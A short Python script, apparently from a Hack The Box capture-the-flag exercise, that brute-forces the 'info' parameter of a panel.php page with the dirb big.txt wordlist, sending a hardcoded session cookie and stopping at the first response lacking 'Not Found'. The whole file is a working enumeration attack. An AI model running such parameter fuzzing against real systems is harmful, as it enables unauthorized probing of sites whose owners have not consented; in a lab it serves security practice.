import requests

url = "http://docker.hackthebox.eu:33981/panel.php?info="

cookie = '_ga=GA1.2.1276808893.1565637968; PHPSESSID=t6mivspm4jsp6godl9t1kbpm71'

fd = open('/usr/share/wordlists/dirb/big.txt','r')

payload = fd.readline()

while payload:
    tempurl = url+payload
    response = requests.get(tempurl,headers={'Cookie':cookie})
    if 'Not Found' in response.text:
        print('Phail',tempurl)
    else:
        print('Success', tempurl)
        break
    payload = fd.readline()
